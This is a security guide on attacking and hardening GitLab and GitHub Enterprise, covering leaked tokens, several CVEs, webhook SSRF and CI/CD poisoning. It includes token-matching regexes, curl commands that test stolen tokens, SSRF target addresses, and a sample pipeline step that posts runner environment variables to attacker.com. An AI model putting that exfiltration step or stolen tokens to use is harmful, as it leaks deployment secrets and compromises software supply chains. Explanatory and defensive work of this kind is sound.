# GitLab GitHub — Exposed Tokens, LFI CVEs

## 1. Introduction to Version Control Security

GitLab and GitHub (Enterprise) are the foundational platforms for modern software development. They host source code, manage collaboration, and often integrate tightly with CI/CD pipelines (via GitHub Actions or GitLab CI).

Because these platforms house the intellectual property of an organization (source code) and act as the starting point for automated deployments, they are highly lucrative targets. A compromise here can lead to massive source code leaks, exposure of hardcoded secrets, or supply chain attacks where malicious code is injected directly into trusted deployment pipelines.

Security testing against these platforms generally falls into two categories:
1. **Application vulnerabilities:** Exploiting CVEs in self-hosted GitLab/GitHub Enterprise instances (e.g., unauthenticated RCE, LFI, SSRF).
2. **Configuration & Credential weaknesses:** Exploiting exposed Personal Access Tokens (PATs), overly permissive repository access, or poisoned CI/CD workflows.

## 2. Architecture & Roles

- **GitLab Instance / GitHub Enterprise Server:** The central web application and database hosting the repositories.
- **Runners / Actions Workers:** Infrastructure that executes the CI/CD pipelines. These can be hosted by the vendor (SaaS) or self-hosted by the organization.
- **Personal Access Tokens (PATs):** Tokens generated by users to interact with the API or authenticate Git over HTTPS.
- **Webhooks:** Automated HTTP callbacks that trigger events (like a Jenkins build) when a commit is pushed.

## 4. Token Exposure & Credential Harvesting

The most common way attackers gain access to repositories is not through zero-days, but through leaked tokens.

### Discovering Leaked Tokens
Developers often accidentally commit Personal Access Tokens, AWS keys, or SSH private keys into repositories.
- **Public Repositories:** Attackers use tools like `trufflehog` or `gitrob` to scan public GitHub/GitLab repositories for high-entropy strings matching token formats.
- **Format Recognition:**
  - GitHub Classic PAT: `ghp_[a-zA-Z0-9]{36}`
  - GitHub Fine-Grained PAT: `github_pat_[a-zA-Z0-9_]{82}`
  - GitLab PAT: `glpat-[a-zA-Z0-9\-]{20}`

### Utilizing Compromised Tokens

Once a token is obtained, it can be used to authenticate via the API or command line.

```bash
# Check token validity and user context (GitHub)
curl -H "Authorization: token ghp_XXXXXXXXXXXXXXXXXXXX" https://api.github.com/user

# Check token validity and user context (GitLab)
curl --header "PRIVATE-TOKEN: glpat-XXXXXXXXXXXXXXXX" "https://gitlab.example.com/api/v4/user"
```

If the token belongs to an administrator or a user with write access to critical repositories, the attacker can clone private repos, modify code, or access CI/CD secrets configured in the repository settings.

## 5. GitLab Specific CVEs (LFI, RCE, SSRF)

Self-hosted GitLab instances have historically been plagued by severe vulnerabilities. Because GitLab is a massive monolithic Ruby on Rails application, its attack surface is large.

### CVE-2021-22205 (ExifTool RCE)
A critical unauthenticated RCE vulnerability. GitLab passed uploaded images to ExifTool to strip metadata. A flaw in ExifTool allowed arbitrary command execution via maliciously crafted DjVu image files.
- **Exploitation:** An attacker could POST a malicious image to any endpoint that accepted user uploads (even unauthenticated endpoints like user registration or snippet creation) and achieve RCE as the `git` user.

### CVE-2020-10977 (Path Traversal / LFI to RCE)
An authenticated user could create a project, open an issue, and use the "Move Issue" feature to trigger a path traversal flaw.
- **Exploitation:** This allowed reading arbitrary files, such as `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`.
- **Escalation:** With the `secret_key_base` extracted from `secrets.yml`, an attacker could forge signed Ruby session cookies, escalating the LFI into a full Remote Code Execution via deserialization.

### SSRF via Webhooks
GitLab's webhook functionality allows users to configure HTTP endpoints to hit upon repository events. If an attacker has sufficient privileges to configure webhooks, they can point the webhook to internal IP addresses (e.g., `http://169.254.169.254` for AWS metadata or `http://127.0.0.1:2379` for internal etcd), turning GitLab into an SSRF proxy. GitLab has implemented mitigations against this, but bypasses occasionally surface.

## 6. GitHub Enterprise Vulnerabilities

While less frequent than GitLab, GitHub Enterprise Server (GHES) also has its share of critical flaws.

### CVE-2024-0200 (Unsafe Reflection RCE)
A vulnerability in GHES where an authenticated attacker with the "organization owner" role could achieve RCE. This flaw involved unsafe reflection in the management console or specific API endpoints, allowing the injection of malicious Java/Ruby objects depending on the subsystem.

### Actions Runner Escapes
A major focus of GitHub security research is escaping the isolated environment of a GitHub Action runner. If an organization uses self-hosted runners and allows public forks to trigger Pull Request workflows, an attacker can submit a malicious PR that executes code on the self-hosted runner, potentially escaping into the host infrastructure.

## 7. CI/CD Pipeline Poisoning

If an attacker gains write access to a repository (via compromised credentials, tokens, or malicious PRs), they can modify the CI/CD configuration files (e.g., `.gitlab-ci.yml`, `.github/workflows/main.yml`).

### Malicious Code Execution in the Pipeline
By adding an innocuous-looking shell command to the build process, the attacker can execute code on the Runner.

```yaml
# Example Malicious addition to a .gitlab-ci.yml
build_stage:
  script:
    - make build
    - curl -X POST -d "$(env)" http://attacker.com/exfil # Exfiltrates CI environment variables
```

CI/CD environments are routinely injected with highly privileged secrets (e.g., `AWS_ACCESS_KEY_ID`, Docker registry credentials) needed for deployment. Exfiltrating the environment variables of the runner often yields the keys to the production environment.

## 8. Defense & Hardening

### 1. Token Management & Secret Scanning
- Enforce short expiration times for Personal Access Tokens.
- Implement pre-commit hooks and server-side secret scanning to prevent credentials from being committed to repositories.
- Use Fine-Grained tokens (GitHub) with scoped permissions rather than Classic tokens with broad access.

### 2. Branch Protection Rules
Enforce branch protection on `main`/`master`. Require multiple approvals (Code Review) for PRs. This prevents an attacker with a single compromised developer account from pushing code directly to production branches.

### 3. Secure CI/CD Runners
- Treat CI/CD runners as highly sensitive, ephemeral environments.
- Avoid using long-lived, self-hosted runners if possible. If necessary, ensure they run in highly restricted network segments with strict outbound firewalls.
- **Never** allow automated CI execution on unverified Pull Requests from public forks in self-hosted environments.

### 4. Patching
For self-hosted instances (GitLab/GHES), aggressive patching is non-negotiable. Vulnerabilities in these platforms are weaponized rapidly by ransomware groups.
